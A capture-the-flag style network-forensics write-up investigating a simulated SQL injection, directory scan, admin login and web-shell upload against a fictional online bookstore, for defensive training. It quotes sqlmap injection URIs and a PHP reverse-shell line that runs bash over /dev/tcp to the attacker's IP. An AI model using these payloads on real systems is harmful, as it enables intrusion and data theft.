## Scenario

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.
Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.
As the lead analyst in this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

## Tools used

- [Wireshark](https://www.wireshark.org/download.html)
- [Tshark](https://www.wireshark.org/docs/man-pages/tshark.html)
- [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
- [CyberChef](https://gchq.github.io/CyberChef)

## MITRE ATT&CK and MITRE D3FEND

### MITRE ATT&CK

- Tactic: `Reconnaissance` [`TA0043`](https://attack.mitre.org/techniques/T1595/)
  + Technique: `Active Scanning: Wordlist Scanning` [`T1595.003`](https://attack.mitre.org/techniques/T1595/003/)

    Attacker use web content discovery tools to enumerate a website’s pages and directories.

- Tactic: `Initial Access` [`TA0001`](https://attack.mitre.org/tactics/TA0001/)
  + Technique: `Exploit Public-Facing Application` [`T1190`](https://attack.mitre.org/techniques/T1190/)

    Attacker use tools to exploit XSS vulnerabilities.
 
- Tactic: `Persistence` [`TA0003`](https://attack.mitre.org/tactics/TA0003/)
  + Technique: `Valid Accounts: Local Accounts` [`T1078.003`](https://attack.mitre.org/techniques/T1078/003/)

    Attacker retrieve and use legitimate local admin account credentials.

- Tactic: `Command and Control` [`TA0011`](https://attack.mitre.org/tactics/TA0011/)
  + Technique: `Application Layer Protocol: Web Protocols` [`T1071.001`](https://attack.mitre.org/techniques/T1071/001/)

    Attacker use HTTPS for Command and Control which carries web traffic may be very common in environments. HTTPS packets have many fields and headers in which data can be concealed.

### MITRE D3FEND

- Tactic: `Harden` [`d3f:Harden`](https://d3fend.mitre.org/tactic/d3f:Harden/)
  + Technique: `Agent Authentication: Multi-factor Authentication` [`D3-MFA`](https://d3fend.mitre.org/technique/d3f:Multi-factorAuthentication)

- Tactic: `Detect` [`d3f:Detect`](https://d3fend.mitre.org/tactic/d3f:Detect)
  + Technique: `Process Analysis: Database Query String Analysis` [`D3-DQSA`](https://d3fend.mitre.org/technique/d3f:DatabaseQueryStringAnalysis/)
  + Technique: `Network Traffic Analysis: Protocol Metadata Anomaly Detection` [`D3-PMAD`](https://d3fend.mitre.org/technique/d3f:ProtocolMetadataAnomalyDetection/)
  + Technique: `Platform Monitoring: File Integrity Monitoring` [`D3-FIM`](https://d3fend.mitre.org/technique/d3f:FileIntegrityMonitoring/)
  + Technique: `File Analysis: File Content Rules` [`D3-FCR`](https://d3fend.mitre.org/technique/d3f:FileContentRules/)


## Questions

### Q1. By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Can you provide the attacker's IP?

Filtering the HTTP protocol, it is easy to recognize that this is an SQLi attack (using sqlmap tool) and file/directory scanning (using gobuster tool).

![{B8F758A1-CEC2-4C4B-9DCA-9CCC28A8214B}](https://github.com/user-attachments/assets/d9209497-90d6-454f-8534-0a5d0ee8d757)

![{51B1EBE2-ECFD-4336-AEF1-DA9B0232D3CB}](https://github.com/user-attachments/assets/32f013f6-c292-4020-8e83-fd02f8ecf71a)

![{3E5CFD97-380F-4C59-95F3-4FA43917FB6B}](https://github.com/user-attachments/assets/cd8b6755-50d9-4bbf-a391-9a73dfdb6fda)

And some malicious credentials

<img src=https://github.com/user-attachments/assets/e8ea804c-d53e-4559-98c0-e0f7702cdc20 width=100%>
<p></p>

**Answer: 111.224.250.131**

### Q2. If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Can you determine the origin city of the attacker?

Use online geolocation tools, such as `https://whatismyipaddress.com`, to determine the location of the identified IP address.

**Answer: Shijiazhuang**

### Q3. Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. Can you provide the vulnerable PHP script name?

According to images in question 1.

**Answer: search.php**

### Q4. Establishing the timeline of an attack, starting from the initial exploitation attempt, What's the complete request URI of the first SQLi attempt by the attacker?

Filtering with the attacker's IP to identify the first SQLi attempt by the attacker.

Pay attention to packet number 347 and 349, where the request URI is `/search.php?search=book%27`. The `%27` character, when URL-decoded, becomes an apostrophe (`'`). This is a commonly used payload to test for SQL Injection (SQLi) vulnerabilities. Then server responds with a **500 Internal Server Error**, it indicates that the web server may be vulnerable to SQLi.

![{D915E788-C4D0-4A5A-8B6E-C5E2A06437F6}](https://github.com/user-attachments/assets/74b083c3-7418-4274-a0dc-a4619add6955)

So, the complete request URI of the first SQLi attempt by the attacker is `/search.php?search=book%20and%201=1;%20--%20-`

**Answer: /search.php?search=book%20and%201=1;%20--%20-**

### Q5. Can you provide the complete request URI that was used to read the web server's available databases?

- First, "read the web server's available databases" --> that means the server responsed to attacker successfully with status code 200.

- Second, in SQL Injection (SQLi) attacks, attackers often exploit information_schema to gain access to the database structure. (Note: most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

Under the Parameters tab, filter parameters containing `information_schema`, then copy those parameter values that also include `search.php`.

![{04534334-56AC-4782-8438-F5E0AC8C80A3}](https://github.com/user-attachments/assets/9f07c6fb-c350-4991-803b-6ab76b771224)

Using `tshark` by running python code to extract `http.file_data` with each parameter (that is a `http.request.uri`). Full code at [References](https://github.com/SonPham14/CyberDefenders-Forensics-Labs/edit/main/Network%20Forensics/Web%20Investigation%20Lab.md#references).

Now, we know the complete request URI that was used to read the web server's available databases.

![image](https://github.com/user-attachments/assets/9d72e5fe-3721-400f-b1a0-5a9d59966bfd)

**Answer: /search.php?search=book%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7178766271%2CJSON_ARRAYAGG%28CONCAT_WS%280x7a76676a636b%2Cschema_name%29%29%2C0x7176706a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA--%20-**

### Q6. Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. What's the table name containing the website users data?

Following the request URI and response, the table name containing user data that could potentially harm the organization's reputation cannot be anything other than the "customers" table.

![{05A6DF80-3BFB-4D0C-9AAF-EBA797AD6EB7}](https://github.com/user-attachments/assets/0f08891c-ac45-480c-a628-2e192735e95f)

HTTP Stream response from above resquest.

![{FFA2C010-F948-495A-B838-98A590DFDA74}](https://github.com/user-attachments/assets/620f7045-8af4-4784-811a-fab790d983fc)

**Answer: customers**

### Q7. The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?

Following the next request and response, we can see the id, password, username that may contain sensitive information. Decode SQL attempt to clearly understand.

![{61375FB6-8A25-4584-A75C-EBFBD567C780}](https://github.com/user-attachments/assets/0d116cdb-2ba8-4067-a2a9-a55c985ce74f)

- URL Decoding First:

![{9B9E1438-216B-45E9-9249-F1F641996F89}](https://github.com/user-attachments/assets/1c2b12b9-e844-47b2-a62f-33e40358678c)

- Hex Decoding:

`0x7178766271` → `"qxvbq"` (Wrap results in output)

`0x7a76676a636b` → `"zvgjck"` (Separator between column names and types)

`0x7176706a71` → `"qvpjq"` (Wrap results in output)

`0x61646d696e` → `"admin"` (Target table name)

`0x626f6f6b776f726c645f6462` → `"bookworld_db"` (Target database schema)

The hacker access sensitive information from the "admin" table - information that should not have been accessible to the public without authorization.

Filtering to remove unnecessary information:
`(_ws.col.protocol == "HTTP") && !(http.user_agent == "gobuster/3.6") && !(http.response.code == 404) && !(_ws.col.info == "HTTP/1.1 403 Forbidden (text/html)") && !(_ws.col.info == "HTTP/1.0 500 Internal Server Error")`

![{2B1CD809-9205-475F-A853-ECCD23F825E7}](https://github.com/user-attachments/assets/99e382ac-5728-43be-9c49-9169aeb1acb3)

Attacker retrieved account information. We also know the /admin/ directory is typically used for administrative functions, making it a potential target for attackers gaining unauthorized access or sensitive information.

![image](https://github.com/user-attachments/assets/da8bf49f-d4b7-4799-8613-4fb2dbc930d8)

And discovered the directory

![{EC6B9358-E804-444E-AC1C-232F1650AE03}](https://github.com/user-attachments/assets/ecaffacc-939c-4ae6-a24d-6ad7b7e5696e)

**Answer: /admin/**

### Q8. Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?

In Credentials tab, web can see the last credentials is `admin:admin123`, so we can guess that account is correct and attacker use for logging in admin account.

<img src=https://github.com/user-attachments/assets/a966af35-0b38-4aa8-a805-4c4bdd7cb8d4 width=100%>
<p></p>

![{50C129CB-8289-46BB-958D-242C5FDB56F7}](https://github.com/user-attachments/assets/6aae66b8-ed3a-478f-8c26-c60f6b2393cb)

**Answer: admin:admin123!**

### Q9. We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?

Attacker create and upload file with a reverse shell to gain further access from compromised web server to C&C: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>`

![{C61C8527-DCC9-42D4-953B-793FE44EC322}](https://github.com/user-attachments/assets/deec52e9-0025-49f3-9b58-f3f821c8a057)

**Answer: NVri2vhp.php**


## References

- [1] SQL Injection: https://portswigger.net/web-security/sql-injection
- [2] Tshark: https://www.wireshark.org/docs/man-pages/tshark.html
- [3] Gobuster: https://github.com/OJ/gobuster
- [4] sqlmap: https://sqlmap.org/
- [5] Full code:
```
import subprocess

# Define the path to the pcap file and the tshark command
pcap_file = "WebInvestigation.pcap"
tshark_path = "tshark"      # Adjust this path if necessary or using just "tshark" if it's in PATH variable environment

# Read parameters from file (one URI per line)
with open("parameter_values.txt", "r", encoding="utf-8") as f:
    parameters = [line.strip() for line in f if line.strip()]

for parameter in parameters:
    # Escape special characters in the URI for the filter
    escaped_param = parameter.replace('"', '\\"')
    
    # Build the tshark command
    command = [
        tshark_path,
        "-r", pcap_file,
        "-Y", f'(ip.dst == 111.224.250.131) && (http.response.code == 200) && (http.request.uri == "{escaped_param}")',
        "-T", "fields",
        "-e", "http.file_data"
    ]

    try:
        # Run the command
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        
        # Process the output
        if result.stdout:
            # Remove whitespace and check if it's hex data
            output = result.stdout.strip()
            if output:
                try:
                    # Try to decode as hex first
                    decoded = bytes.fromhex(output).decode('utf-8', errors='replace')
                    print(f"\nMatch found for URI: {parameter}")
                    print("Decoded file_data:")
                    print(decoded)
                except ValueError:
                    # If not hex, print as-is
                    print(f"\nMatch found for URI: {parameter}")
                    print("File_data (raw):")
                    print(output)
        else:
            print(f"\nNo match found for URI: {parameter}")
            
    except subprocess.CalledProcessError as e:
        print(f"\nError processing URI: {parameter}")
        print(f"Command failed with error: {e.stderr}")
```
